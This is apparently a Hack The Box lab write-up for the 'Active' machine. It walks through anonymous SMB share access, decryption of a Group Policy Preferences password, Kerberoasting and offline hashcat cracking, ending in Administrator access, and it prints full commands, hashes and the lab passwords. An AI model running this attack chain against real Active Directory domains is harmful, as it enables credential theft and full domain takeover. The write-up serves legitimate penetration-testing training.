---
title: "Active Walkthrough - HTB Easy | GPP Passwords & Kerberoasting"
description: "Complete walkthrough of Active from Hack The Box. Covers GPP password exploitation, Kerberoasting attack, and Active Directory privilege escalation techniques used in real-world penetration testing."
author: dua2z3rr
date: 2025-12-05 1:00:00
categories: [HackTheBox, Machines]
tags: ["enterprise-network", "vulnerability-assessment", "active-directory", "software-and-os-exploitation", "security-tools", "authentication", "default-credentials", "weak-permissions", "anonymous-or-guest-access", "smb", "kerberos", "reconnaissance", "password-cracking", "kerberoasting"]
image: /assets/img/active/active-resized.png
---

## Overview

Active is an easy-to-medium difficulty Windows box from Hack The Box that demonstrates two widespread techniques for obtaining privileges within an Active Directory environment. This walkthrough covers GPP password exploitation and Kerberoasting attacks.

---

## External Enumeration

### Nmap Scan

Starting with a full port scan to identify open services:

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $nmap 10.10.10.100 -vv -A
<SNIP>
PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-12-05 11:35:32Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1
```

**Key findings:**
- Domain Controller identified (DNS, Kerberos, LDAP)
- Domain name: `active.htb`
- SMB service available on port 445

---

## Initial Access

### SMB Enumeration

Enumerating SMB shares with `smbmap` without credentials:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $smbmap -H 10.10.10.100
[+] IP: 10.10.10.100:445	Name: 10.10.10.100                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS
```

**Important discovery:** The `Replication` share is accessible with READ ONLY permissions without authentication.

### Downloading Share Contents

Recursively downloading all files from the Replication share:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $smbclient //10.10.10.100/Replication
Password for [WORKGROUP\dua2z3rr]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> RECURSE ON
smb: \> PROMPT OFF
smb: \> mget *
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
```

The share appears to be a replica of the default `SYSVOL` share, which contains Group Policy Objects (GPOs) and is accessible to all authenticated users.

### GPP Password Discovery

Examining the `Groups.xml` file, which is the only readable XML:

```xml
┌─[dua2z3rr@parrot]─[~]
└──╼ $cat active.htb/Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/MACHINE/Preferences/Groups/Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
  <User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" 
        name="active.htb\SVC_TGS" 
        image="2" 
        changed="2018-07-18 20:46:06" 
        uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}">
    <Properties action="U" 
                newName="" 
                fullName="" 
                description="" 
                cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" 
                changeLogon="0" 
                noChange="1" 
                neverExpires="1" 
                acctDisabled="0" 
                userName="active.htb\SVC_TGS"/>
  </User>
</Groups>
```

**Discovery:** Found an encrypted password for user `SVC_TGS` (the name suggests this is a Kerberos Ticket Granting Service account).

---

## GPP Password Decryption

### Understanding GPP Encryption

Group Policy Preferences (GPP) is a Windows feature that allows administrators to manage settings across multiple machines in an Active Directory environment. One of its features was to set passwords for local accounts, which are stored in XML files within the SYSVOL directory.

**Key vulnerability:**
- **Encryption type:** GPP passwords are encrypted using AES (Advanced Encryption Standard)
- **Security flaw:** The encryption key is publicly known, making it relatively simple for attackers to decrypt the passwords

### Decrypting with gpp-decrypt

Using the `gpp-decrypt` tool included in Kali Linux:

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

**Credentials obtained:**
- **Username:** `SVC_TGS`
- **Password:** `GPPstillStandingStrong2k18`

---

## Authenticated SMB Access

### Enumerating with Valid Credentials

Since RDP and WinRM ports are not open, we enumerate SMB with our newly acquired credentials:

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $smbmap -H 10.10.10.100 -u SVC_TGS -p GPPstillStandingStrong2k18
[+] IP: 10.10.10.100:445	Name: 10.10.10.100                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY
```

### Accessing the Users Share

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $smbclient //10.10.10.100/Users -U SVC_TGS --password=GPPstillStandingStrong2k18
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 16:39:20 2018
  ..                                 DR        0  Sat Jul 21 16:39:20 2018
  Administrator                       D        0  Mon Jul 16 12:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 07:06:44 2009
  Default                           DHR        0  Tue Jul 14 08:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 07:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 06:57:55 2009
  Public                             DR        0  Tue Jul 14 06:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 17:16:32 2018

		5217023 blocks of size 4096. 278537 blocks available
```

**User flag obtained** from `SVC_TGS\Desktop\user.txt`

---

## Privilege Escalation

### Enumerating Active Users

Using LDAP to enumerate non-disabled users on the domain controller:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName
sAMAccountName: Administrator
sAMAccountName: SVC_TGS
```

We can achieve the same result more simply using `impacket-GetADUsers`:

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $impacket-GetADUsers -all active.htb/svc_tgs -dc-ip 10.10.10.100
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Querying 10.10.10.100 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-18 21:06:40  2025-12-05 12:21:32 
Guest                                                 <never>              <never>             
krbtgt                                                2018-07-18 20:50:36  <never>             
SVC_TGS                                               2018-07-18 22:14:38  2018-07-21 16:01:30
```

**Key finding:** Besides our compromised account, the `Administrator` account is also active.

---

## Kerberoasting Attack

### Understanding Kerberoasting

Kerberoasting is an attack technique that exploits the way Kerberos authentication handles service tickets (TGS-REP). When a service account has a Service Principal Name (SPN) set, any authenticated user can request a service ticket for that account, which is encrypted with the service account's password hash. This ticket can then be cracked offline.

### Identifying Service Accounts

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.10.10.100
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2025-12-05 12:21:32.518169
```

**Important:** The Administrator account has an SPN configured, making it vulnerable to Kerberoasting.

### Requesting the TGS Ticket

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $impacket-GetUserSPNs active.htb/svc_tgs -dc-ip 10.10.10.100 -request
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2025-12-05 12:21:32.518169

[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$66394d303b9b04afc309ebc2424822a5$f9dd63dfc5569f21c06d690fe4859943c5ef81cb750d36fe4ea4516342d215cf[...]
```

---

## Cracking with Hashcat

### Offline Password Cracking

Saving the TGS ticket to `hash.txt` and cracking with hashcat:

```shell
┌─[dua2z3rr@parrot]─[~]
└──╼ $hashcat -m 13100 hash.txt rockyou.txt
hashcat (v6.2.6) starting

<SNIP>

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$[...]:Ticketmaster1968
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Time.Started.....: Fri Dec  5 17:41:53 2025 (13 secs)
Time.Estimated...: Fri Dec  5 17:42:06 2025 (0 secs)
Speed.#1.........:   849.7 kH/s
Recovered........: 1/1 (100.00%) Digests
```

**Administrator credentials:**
- **Username:** `Administrator`
- **Password:** `Ticketmaster1968`

---

## Root Access

### Accessing C$ as Administrator

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $smbclient //10.10.10.100/C$ -U Administrator --password=Ticketmaster1968
Try "help" to get a list of possible commands.
smb: \> cd Users\Administrator\Desktop\
smb: \Users\Administrator\Desktop\> ls
  .                                  DR        0  Thu Jan 21 17:49:47 2021
  ..                                 DR        0  Thu Jan 21 17:49:47 2021
  desktop.ini                       AHS      282  Mon Jul 30 15:50:10 2018
  root.txt                           AR       34  Fri Dec  5 12:21:30 2025

		5217023 blocks of size 4096. 278137 blocks available
smb: \Users\Administrator\Desktop\> more root.txt 
```

**Root flag obtained!** Box completed.

---

## Reflections

### What Surprised Me

I didn't expect to find the GPP password file so easily accessible in a publicly readable SMB share. This really highlighted how dangerous default configurations can be in Active Directory environments—what seems like a "read-only" share to an admin can be a goldmine for attackers.

### Main Mistake

I wasted about 30 minutes trying to crack the cpassword hash with standard wordlists before realizing that GPP passwords use AES256 encryption with a publicly known key, not traditional password hashing. This taught me to always research the encryption/hashing method before throwing hashcat at everything. Understanding **how** something is encrypted matters as much as being able to crack it.

### Alternative Approaches

If I were to redo this box, I would have started with `enum4linux` right away instead of spending time with nmap scripts that didn't provide useful information for SMB enumeration. Also, I could have used `crackmapexec` for a more streamlined approach to both SMB enumeration and executing the Kerberoasting attack.

### Open Question

In a real-world Active Directory environment, how do blue teams monitor access to GPP files with sensitive information? Are there specific SIEM rules or alerts that trigger when someone accesses these policy files anonymously? I'd be interested to know what defensive measures actually work against this attack vector.

---

**Completed this box? How did you approach the GPP password discovery?** Comment down below!
